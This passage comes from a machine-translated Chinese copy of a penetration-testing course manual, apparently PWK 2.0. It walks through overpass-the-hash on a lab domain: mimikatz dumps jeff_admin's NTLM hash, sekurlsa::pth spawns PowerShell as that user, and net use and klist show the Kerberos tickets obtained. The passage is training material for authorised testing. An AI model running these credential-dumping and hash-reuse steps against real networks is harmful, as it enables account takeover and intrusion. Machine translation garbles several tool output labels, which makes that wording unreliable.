<div style="position:absolute;top:48707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">672 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2014 年），https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护-a</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:48741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">673 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Skip Duckwall 和 Benjamin Delphy，2014），https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:48883;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="42"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 42 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48916;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:49993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:49993;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:49993;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">659</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font><font style="vertical-align: inherit;">来自</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">mimikatz</font></font></b><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::logonpasswords</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">来验证这</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一点</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它</font></font></nobr></div>
<div style="position:absolute;top:49031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转储缓存的密码哈希。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::logonpasswords</font></font></font></b></nobr></div>
<div style="position:absolute;top:49100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证 ID : 0 ; </font><font style="vertical-align: inherit;">2815531 (00000000:002af62b)</font></font></nobr></div>
<div style="position:absolute;top:49117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议    </font></font></nobr></div>
<div style="position:absolute;top:49117;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 从 0 开始互动</font></font></nobr></div>
<div style="position:absolute;top:49134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:49134;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰夫管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:49151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域    </font></font></nobr></div>
<div style="position:absolute;top:49151;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 公司</font></font></nobr></div>
<div style="position:absolute;top:49168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录服务器：DC01</font></font></nobr></div>
<div style="position:absolute;top:49185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录时间    </font></font></nobr></div>
<div style="position:absolute;top:49185;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 12/02/2018 09.18.57</font></font></nobr></div>
<div style="position:absolute;top:49202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:49202;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: S-1-5-21-1602875587-2787523311-2599479668-1105</font></font></nobr></div>
<div style="position:absolute;top:49219;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微信：</font></font></nobr></div>
<div style="position:absolute;top:49236;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000003] 初级</font></font></nobr></div>
<div style="position:absolute;top:49253;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 用户名：jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:49270;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 域：CORP</font></font></nobr></div>
<div style="position:absolute;top:49287;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* NTLM : </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e2b475c11da2a0748290d87aa966c327</font></font></font></b></nobr></div>
<div style="position:absolute;top:49303;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* SHA1：8c77f430e4ab8acb10ead387d64011c76400d26e</font></font></nobr></div>
<div style="position:absolute;top:49320;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* DPAPI：2918ad3d4607728e28ccbd76eab494b9</font></font></nobr></div>
<div style="position:absolute;top:49338;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">茶匙：</font></font></nobr></div>
<div style="position:absolute;top:49355;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">摘要：</font></font></nobr></div>
<div style="position:absolute;top:49372;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 用户名：jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:49388;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 域：CORP</font></font></nobr></div>
<div style="position:absolute;top:49405;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 密码：（空）</font></font></nobr></div>
<div style="position:absolute;top:49422;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核：</font></font></nobr></div>
<div style="position:absolute;top:49439;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 用户名：jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:49456;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 域：CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:49473;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\* 密码：（空）</font></font></nobr></div>
<div style="position:absolute;top:49490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:49509;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 701 - 为 Jeff_Admin 转储密码哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此输出显示 Jeff_Admin 的缓存凭据，包括 NTLM 哈希，我们将</font></font></nobr></div>
<div style="position:absolute;top:49558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用来超越散列。</font></font></nobr></div>
<div style="position:absolute;top:49591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跨越哈希技术的本质是将NTLM哈希变成Kerberos票据</font></font></nobr></div>
<div style="position:absolute;top:49610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并避免使用 NTLM 身份验证。</font><font style="vertical-align: inherit;">一个简单的方法是再次使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::pth</font></font></font></b></nobr></div>
<div style="position:absolute;top:49630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Mimikatz 的命令。</font></font></nobr></div>
<div style="position:absolute;top:49663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该命令需要一些参数并在上下文中创建一个新的 PowerShell 进程</font></font></nobr></div>
<div style="position:absolute;top:49682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jeff_Admin 用户。</font><font style="vertical-align: inherit;">这个新的 PowerShell 提示将允许我们获得 Kerberos 票证</font></font></nobr></div>
<div style="position:absolute;top:49702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过网络执行 NTLM 身份验证，使这种攻击与传统的攻击不同</font></font></nobr></div>
<div style="position:absolute;top:49721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递哈希。</font></font></nobr></div>
<div style="position:absolute;top:49754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为第一个参数，我们指定</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/user:</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/domain:</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，将它们设置为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:49774;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">corp.com</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别。</font><font style="vertical-align: inherit;">我们将使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ntlm:</font></font></b><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">指定 NTLM 哈希，</font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后使用</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/run:</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要创建的过程（在本例中为 PowerShell）。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:49844;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">87aa966c327 /run:PowerShell.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：jeff_admin</font></font></nobr></div>
<div style="position:absolute;top:49878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名：corp.com</font></font></nobr></div>
<div style="position:absolute;top:49895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序：cmd.exe</font></font></nobr></div>
<div style="position:absolute;top:49912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侵犯。</font><font style="vertical-align: inherit;">： 不</font></font></nobr></div>
<div style="position:absolute;top:49929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM : e2b475c11da2a0748290d87aa966c327</font></font></nobr></div>
<div style="position:absolute;top:49946;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">PID 4832</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:50071;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="43"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 43 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:50104;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:51181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:51181;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:51181;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">660</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50200;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">工号 2268</font></font></nobr></div>
<div style="position:absolute;top:50216;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">LSA 过程现在是 R/W</font></font></nobr></div>
<div style="position:absolute;top:50233;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">LUID 0 ; </font><font style="vertical-align: inherit;">1197687 (00000000:00124677)</font></font></nobr></div>
<div style="position:absolute;top:50250;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ msv1_0 - 数据复制@ 040E5614：好的！</font></font></nobr></div>
<div style="position:absolute;top:50268;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ kerberos - 数据复制@ 040E5438</font></font></nobr></div>
<div style="position:absolute;top:50284;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ aes256_hmac -&gt; null</font></font></nobr></div>
<div style="position:absolute;top:50301;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ aes128_hmac -&gt; null</font></font></nobr></div>
<div style="position:absolute;top:50318;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ rc4_hmac_nt 好的</font></font></nobr></div>
<div style="position:absolute;top:50335;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ rc4_hmac_old 好的</font></font></nobr></div>
<div style="position:absolute;top:50352;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ rc4_md4    </font></font></nobr></div>
<div style="position:absolute;top:50352;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的</font></font></nobr></div>
<div style="position:absolute;top:50369;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ rc4_hmac_nt_exp OK</font></font></nobr></div>
<div style="position:absolute;top:50386;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ rc4_hmac_old_exp OK</font></font></nobr></div>
<div style="position:absolute;top:50403;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\_ *密码替换 -&gt; null</font></font></nobr></div>
<div style="position:absolute;top:50422;left:241"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 702 - 创建具有不同用户 NTLM 密码哈希的进程</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们有一个新的 PowerShell 会话，允许我们执行命令</font></font></nobr></div>
<div style="position:absolute;top:50471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰夫_管理员。</font></font></nobr></div>
<div style="position:absolute;top:50504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列出缓存的 Kerberos 票证</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b></nobr></div>
<div style="position:absolute;top:50573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录 ID 为 0:0x1583ae</font></font></nobr></div>
<div style="position:absolute;top:50607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存门票：(0)</font></font></nobr></div>
<div style="position:absolute;top:50626;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 703 - 列出 Kerberos 票证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有缓存 Kerberos 票证，但这是预期的，因为 Jeff_Admin 尚未执行</font></font></nobr></div>
<div style="position:absolute;top:50675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">交互式登录。</font><font style="vertical-align: inherit;">但是，让我们通过对网络共享进行身份验证来生成 TGT</font></font></nobr></div>
<div style="position:absolute;top:50694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络使用的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net use \\dc01</font></font></font></b></nobr></div>
<div style="position:absolute;top:50746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:50780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b></nobr></div>
<div style="position:absolute;top:50814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录 ID 为 0:0x1583ae</font></font></nobr></div>
<div style="position:absolute;top:50848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存门票：（3）</font></font></nobr></div>
<div style="position:absolute;top:50882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#0&gt; 客户：jeff_admin @ CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:50899;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：krbtgt/CORP.COM @ CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:50916;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerbTicket 加密类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:50933;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证标志 0x60a10000 -&gt; forwardable forwarded 可再生 pre_authent name_canoni</font></font></nobr></div>
<div style="position:absolute;top:50950;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间：2/12/2018 13:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:50967;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束时间：2/12/2018 23:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:50984;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新时间：2/19/2018 13:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51001;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:51018;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存标志：0x2 -&gt; DELEGATION</font></font></nobr></div>
<div style="position:absolute;top:51035;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kdc 调用：DC01.corp.com</font></font></nobr></div>
<div style="position:absolute;top:51069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#1&gt; 客户：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin @ CORP.COM</font></font></font></b></nobr></div>
<div style="position:absolute;top:51085;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">krbtgt/CORP.COM @ CORP.COM</font></font></font></b></nobr></div>
<div style="position:absolute;top:51103;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerbTicket 加密类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:51120;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证标志 0x40e10000 -&gt; 可转发可更新初始 pre_authent name_canonica </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:51259;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="44"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 44 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51292;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:52369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:52369;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:52369;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">661</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51388;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间：2/12/2018 13:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51404;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束时间：2/12/2018 23:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51421;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新时间：2/19/2018 13:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51438;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:51456;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存标志：0x1 -&gt; PRIMARY</font></font></nobr></div>
<div style="position:absolute;top:51472;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kdc 调用：DC01.corp.com</font></font></nobr></div>
<div style="position:absolute;top:51506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#2&gt; 客户：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin @ CORP.COM</font></font></font></b></nobr></div>
<div style="position:absolute;top:51523;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cifs/dc01 @ CORP.COM</font></font></font></b></nobr></div>
<div style="position:absolute;top:51540;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">KerbTicket 加密类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:51557;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">票证标志 0x40a50000 -&gt; 可转发可更新 pre_authent ok_as_delegate name_c</font></font></nobr></div>
<div style="position:absolute;top:51574;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间：2/12/2018 13:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51591;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束时间：2/12/2018 23:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51608;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新时间：2/19/2018 13:59:40（本地）</font></font></nobr></div>
<div style="position:absolute;top:51625;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话密钥类型：AES-256-CTS-HMAC-SHA1-96</font></font></nobr></div>
<div style="position:absolute;top:51642;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓存标志：0</font></font></nobr></div>
<div style="position:absolute;top:51659;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kdc 调用：DC01.corp.com</font></font></nobr></div>
<div style="position:absolute;top:51678;left:197"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 704 - 在域控制器上映射网络共享并列出 Kerberos 票证</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出表明</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net use</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功。</font><font style="vertical-align: inherit;">然后我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">klist</font></font></font></b></nobr></div>
<div style="position:absolute;top:51727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令列出新请求的 Kerberos 票证，其中包括</font><i><font style="vertical-align: inherit;">CIFS</font></i><font style="vertical-align: inherit;">的 TGT 和 TGS</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:51747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:51809;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在这个例子中随意使用了“net use”，但我们可以使用任何</font></font></i></nobr></div>
<div style="position:absolute;top:51828;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要域权限的命令，随后将创建一个</font></font></i></nobr></div>
<div style="position:absolute;top:51848;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TGS。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在已经将我们的 NTLM 哈希转换为 Kerberos TGT，允许我们使用任何依赖于</font></font></nobr></div>
<div style="position:absolute;top:51929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kerberos 身份验证（而不是 NTLM），例如来自官方的 PsExec 应用程序</font></font></nobr></div>
